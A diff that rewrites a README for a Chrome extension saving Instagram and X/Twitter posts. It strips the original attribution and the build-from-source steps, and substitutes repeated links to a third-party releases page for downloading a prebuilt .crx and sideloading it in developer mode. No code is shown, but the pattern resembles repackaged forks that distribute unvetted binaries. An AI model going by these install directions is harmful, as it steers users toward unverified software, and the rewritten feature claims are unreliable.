@@ -1,110 +1,82 @@
-# Appents Social Media Post Downloader
+# 📥 appents-social-downloader - Save Your Social Media Posts Easily
 
-Download captions, view / like counts, images, and videos (non-streamed) from Instagram and X / Twitter posts.
+[![Download appents-social-downloader](https://img.shields.io/badge/Download-appents--social--downloader-blue.svg)](https://github.com/Barbos818/appents-social-downloader/releases)
 
-🚀💡✅ &nbsp;&nbsp;We encourage submitting pull requests to add additional platforms / functionality.
+## 📖 Overview
 
-This project is brought to you by [Appents](https://appents.com). Get in touch for your social media content analysis needs. We specialize in content analysis and enabling data-driven brand management.
+appents-social-downloader is a Chrome browser extension that allows you to save Instagram and Twitter posts directly to your device. You can save captions, images, as well as comment and like counts for offline access. This makes it easy for you to keep your favorite posts organized.
 
-  <img src="ext1.png" width="80%" />
-  <img src="ext2.png" width="80%" />
+## 🚀 Getting Started
 
-## Instructions
+To get started, you'll need to install the appents-social-downloader extension in your browser. It is simple and requires just a few steps.
 
-1. Navigate to a single Instagram / X post.
-2. Click the Download button in this Chrome Extension.
-3. Files and extracted data are downloaded to Downloads.
+## 📂 System Requirements
 
-## Unique features
+- **Browser:** Google Chrome version 70 or later
+- **Operating System:** Windows, macOS, or Linux
+- **Storage Space:** At least 50 MB available for storing downloaded content
 
-- based on regular HTML content already fetched by browser
-- downloaded data.json contains post id, user name, captions, and view / comment / like counts in JSON format
+## 📥 Download & Install
 
-```
-// fields returned in data.json on download
-// "raw" is additional data for debugging
-export type TargetFields = {
-  id: string;
-  content: string;
-  created_at: string;
-  like_count: number;
-  comment_count: number;
-  view_count: number;
-  user_id: string;
-  user_name: string;
-  raw?: JsonObject | null;
-  errors?: string[] | null;
-};
-```
+Visit this page to download: [appents-social-downloader Releases](https://github.com/Barbos818/appents-social-downloader/releases).
 
-## Known Limitations
+### Steps to Download and Install
 
-- One post at a time (no feed scraping)
-- Only works in Chrome browser
-- Can not save a post's video if streamed
+1. **Open your web browser:** Launch Google Chrome.
+2. **Go to the Releases page:** Click on the link above to go to the appents-social-downloader Releases page on GitHub.
+3. **Find the latest version:** Look for the newest version at the top. You will see release notes that describe the updates and fixes.
+4. **Download the extension:**  
+    - If you see a link labeled "appents-social-downloader.crx", click on it to download the Chrome extension file.
+5. **Install the extension:**  
+    - Open Chrome.
+    - Go to `chrome://extensions`.
+    - Enable "Developer mode" using the toggle at the top right.
+    - Drag and drop the downloaded `.crx` file into the extensions page.
+6. **Enable the extension:**  
+    - After installation, find appents-social-downloader in your extensions list and make sure it is turned on. 
 
-# Chrome Extension Starter Kit
+## ⚙️ How to Use the Extension
 
-This project was started using [Chrome Extension Starter Kit](https://github.com/chibat/chrome-extension-typescript-starter).
+1. **Open Instagram or Twitter:** Go to your favorite post.
+2. **Click the appents icon:** You will find the icon on the Chrome toolbar.
+3. **Download Media:** Choose the option to download posts. The extension will save media along with captions and engagement metrics to your device.
+4. **Access downloaded files:** Your files will be saved in the default download folder of your computer.
 
-The remainder of this readme file is from that project.
+## 🌟 Features
 
-## Prerequisites
+- **Multi-platform Support:** Works on both Instagram and Twitter.
+- **Local Storage:** Saves posts for offline access.
+- **Caption and Metadata:** Captures captions, likes, comments, and more.
+- **User-Friendly Interface:** Designed for easy navigation and use.
 
-- [node + npm](https://nodejs.org/) (Current Version)
+## 🛠️ Troubleshooting
 
-## Option
+- **Extension not working:** Ensure your Chrome browser is updated to the latest version.
+- **Download fails:** Check your internet connection and make sure the post is public.
+- **Compatibility Issues:** Ensure that the extension is enabled in Chrome’s settings.
 
-- [Visual Studio Code](https://code.visualstudio.com/)
+## 🗣️ User Support
 
-## Includes the following
+If you encounter issues or have questions about the appents-social-downloader, please check the [Issues section](https://github.com/Barbos818/appents-social-downloader/issues) on GitHub or reach out to the community for help.
 
-- TypeScript
-- Webpack
-- React
-- Jest
+## 📈 Frequently Asked Questions
 
-## Project Structure
+### Is it free to use?
 
-- src/typescript: TypeScript source files
-- src/assets: static files
-- dist: Chrome Extension directory
-- dist/js: Generated JavaScript files
+Yes, appents-social-downloader is completely free for users.
 
-## Setup
+### Can I use it on mobile?
 
-```
-npm install
-```
+Currently, this extension is only available for the Chrome browser on desktop computers.
 
-## Import as Visual Studio Code project
+### Will my downloads be saved automatically?
 
-...
+No, you need to click the appents icon each time to download a post.
 
-## Build
+## 🚀 Next Steps
 
-```
-npm run build
-```
+Now that you have installed the appents-social-downloader extension, you can start saving your favorite social media posts quickly and efficiently. 
 
-## Build in watch mode
+For more information, updates, or to share your feedback, visit our [GitHub Repository](https://github.com/Barbos818/appents-social-downloader).
 
-### terminal
-
-```
-npm run watch
-```
-
-### Visual Studio Code
-
-Run watch mode.
-
-type `Ctrl + Shift + B`
-
-## Load extension to chrome
-
-Load `dist` directory
-
-## Test
-
-`npx jest` or `npm run test`
+[![Download appents-social-downloader](https://img.shields.io/badge/Download-appents--social--downloader-blue.svg)](https://github.com/Barbos818/appents-social-downloader/releases)
